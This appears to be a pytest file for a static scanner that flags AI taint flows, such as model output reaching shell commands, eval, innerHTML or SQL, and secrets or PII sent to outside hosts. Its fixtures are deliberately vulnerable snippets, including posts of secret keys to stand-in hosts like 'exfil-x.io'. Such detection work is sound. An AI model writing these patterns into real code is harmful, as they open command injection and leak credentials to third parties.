"""Phase 3 taint rules: AI001, AI002, AI004, AI006 + supersedes dedup."""

from __future__ import annotations

from pathlib import Path

from conftest import fake_openai_key

from stoa.ai_taint import detect_ai_taint
from stoa.ast_layer import parse
from stoa.config import StoaConfig
from stoa.scanner import ScanOptions, gate_findings, run_scan


def taint(src, providers=None, lang="python", path="a.py", config=None):
    parsed = parse(path, lang, src)
    return detect_ai_taint(parsed, path, False, config or StoaConfig(), providers or [])


def by(findings, rule=None, variant=None):
    out = findings
    if rule:
        out = [f for f in out if f.rule_id == rule]
    if variant:
        out = [f for f in out if f.variant == variant]
    return out


# --- AI002 -----------------------------------------------------------------

def test_ai002_exec_is_critical_high_and_gate_eligible():
    src = (
        "def h(response):\n"
        "    reply = response.choices[0].message.content\n"
        "    cmd = reply.strip()\n"
        "    subprocess.run(cmd, shell=True)\n"
    )
    fs = by(taint(src), rule="AI002")
    assert len(fs) == 1
    f = fs[0]
    assert f.variant == "exec" and f.severity == "critical" and f.confidence == "high"
    assert f.gate_eligible is True
    assert [s.role for s in f.flow] == ["source", "propagation", "sink"]
    assert f.owasp == {"llm_top10_v1_1": "LLM02", "llm_top10_2025": "LLM05"}


def test_ai002_markup_js_is_high_not_gate():
    src = (
        "function h(completion) {\n"
        "  const html = completion.choices[0].message.content;\n"
        "  container.innerHTML = html;\n"
        "}\n"
    )
    fs = by(taint(src, lang="javascript", path="a.js"), rule="AI002")
    assert len(fs) == 1
    assert fs[0].variant == "markup" and fs[0].severity == "high"
    assert fs[0].gate_eligible is False


def test_ai002_remediated_allowlist_dispatch_not_flagged():
    # Model output used only as a dict key -> taint does not reach a sink.
    src = (
        "def h(response):\n"
        "    choice = response.choices[0].message.content.strip()\n"
        "    if choice in ACTIONS:\n"
        "        ACTIONS[choice]()\n"
    )
    assert by(taint(src), rule="AI002") == []


# --- AI001 -----------------------------------------------------------------

def test_ai001_request_into_system_prompt_escalates():
    src = (
        "def ask(request):\n"
        "    topic = request.get_json()['topic']\n"
        "    prompt = f'You are a bot. {topic}'\n"
        "    client.messages.create(system=prompt, messages=[])\n"
    )
    fs = by(taint(src), rule="AI001")
    assert len(fs) == 1
    assert fs[0].severity == "high"
    assert "system_role_interpolation" in fs[0].evidence_tags


def test_ai001_no_flow_when_input_not_reaching_model():
    src = "def h(request):\n    topic = request.get_json()['t']\n    log(topic)\n"
    assert by(taint(src), rule="AI001") == []


# --- AI004 -----------------------------------------------------------------

def test_ai004_pii_into_external_model_medium():
    src = (
        "def h(user):\n"
        "    prompt = f'Remind {user.email} SSN {user.ssn}'\n"
        "    openai.chat.completions.create(messages=[{'role': 'user', 'content': prompt}])\n"
    )
    fs = by(taint(src, providers=["openai"]), rule="AI004")
    assert len(fs) == 1
    assert fs[0].variant == "pii" and fs[0].severity == "medium"
    assert "never read or transmitted by Stoa" in fs[0].message


def test_ai004_secret_class_high():
    src = (
        "def h():\n"
        "    prompt = f'key is {settings.api_key}'\n"
        "    openai.chat.completions.create(messages=[{'role':'user','content':prompt}])\n"
    )
    fs = by(taint(src, providers=["openai"]), rule="AI004")
    assert fs and fs[0].variant == "secret" and fs[0].severity == "high"


# --- AI006 -----------------------------------------------------------------

def test_ai006_secret_to_egress_high():
    src = (
        "def h(user):\n"
        "    payload = {'key': os.environ['STRIPE_SECRET_KEY'], 'u': user.email}\n"
        "    requests.post('https://telemetry.thirdparty-x.io/e', json=payload)\n"
    )
    fs = by(taint(src), rule="AI006")
    assert len(fs) == 1
    assert fs[0].severity == "high"


def test_ai006_allowed_host_suppresses():
    cfg = StoaConfig()
    cfg.ai006_allowed_hosts = ["telemetry.thirdparty-x.io"]
    src = (
        "def h():\n"
        "    payload = {'key': os.environ['STRIPE_SECRET_KEY']}\n"
        "    requests.post('https://telemetry.thirdparty-x.io/e', json=payload)\n"
    )
    assert by(taint(src, config=cfg), rule="AI006") == []


def test_ai006_provider_host_is_not_egress():
    # A credential in an OpenAI call is AI004's jurisdiction, not AI006.
    src = (
        "def h():\n"
        "    payload = {'key': os.environ['OPENAI_API_KEY']}\n"
        "    requests.post('https://api.openai.com/v1/x', json=payload)\n"
    )
    assert by(taint(src), rule="AI006") == []


def test_ai006_flow_snippets_redacted():
    key = fake_openai_key()
    src = (
        "def h():\n"
        f"    token = '{key}'\n"
        "    requests.post('https://exfil-x.io/e', json={'t': token})\n"
    )

    # token is a literal secret -> SEC001 style; AI006 secret source is env/attr,
    # so use an attribute source but assert redaction on any produced flow.
    fs = taint(src)
    for f in fs:
        for step in f.flow:
            assert key not in step.snippet


# --- supersedes dedup + precision (end-to-end) -----------------------------

def test_ai002_sql_supersedes_sec003(tmp_path):
    (tmp_path / "q.py").write_text(
        "def q(response):\n"
        "    name = response.choices[0].message.content\n"
        "    cursor.execute(f'SELECT * FROM t WHERE n = {name}')\n",
        encoding="utf-8",
    )
    result = run_scan(ScanOptions(root=tmp_path, no_git=True))
    rules_at_line = {(f.rule_id, f.line) for f in result.findings}
    ai002 = [f for f in result.findings if f.rule_id == "AI002"]
    assert ai002 and ai002[0].variant == "sql"
    assert "SEC003" in ai002[0].supersedes
    # SEC003 at that line was superseded and removed.
    assert ("SEC003", 3) not in rules_at_line


def test_ai005_supersedes_net001(tmp_path):
    (tmp_path / "c.py").write_text(
        'client = OpenAI(base_url="http://gpu.mlplatform-x.io/v1")\n', encoding="utf-8"
    )
    result = run_scan(ScanOptions(root=tmp_path, no_git=True))
    rule_ids = {f.rule_id for f in result.findings}
    assert "AI005" in rule_ids and "NET001" not in rule_ids


def test_ai002_gate_fires_on_new_exec_flow(tmp_path):
    (tmp_path / "x.py").write_text(
        "def h(response):\n"
        "    reply = response.choices[0].message.content\n"
        "    eval(reply)\n",
        encoding="utf-8",
    )
    result = run_scan(ScanOptions(root=tmp_path, no_git=True))
    tripped = gate_findings(result, StoaConfig(fail_on="critical"))
    assert any(f.rule_id == "AI002" for f in tripped)


CLEAN_AI002_CORPUS = [
    # remediated: dispatch by key
    "def h(r):\n    c = r.choices[0].message.content.strip()\n    if c in A:\n        A[c]()\n",
    # model output only logged
    "def h(r):\n    reply = r.choices[0].message.content\n    logger.info(reply)\n",
    # constant command, no model output
    "def h():\n    subprocess.run('ls', shell=True)\n",
    # model output rendered as text (JS)
    ("function h(c){ const t = c.choices[0].message.content; el.textContent = t; }", "javascript", "a.js"),
    # sql with parameterized query, no model output
    "def h(uid):\n    cursor.execute('SELECT * FROM t WHERE id = %s', (uid,))\n",
]


def test_ai002_precision_zero_high_confidence_on_clean_corpus():
    for item in CLEAN_AI002_CORPUS:
        src, lang, path = item if isinstance(item, tuple) else (item, "python", "a.py")
        highs = [
            f for f in taint(src, lang=lang, path=path)
            if f.rule_id == "AI002" and f.confidence == "high"
        ]
        assert highs == [], f"false positive on clean corpus: {src!r}"
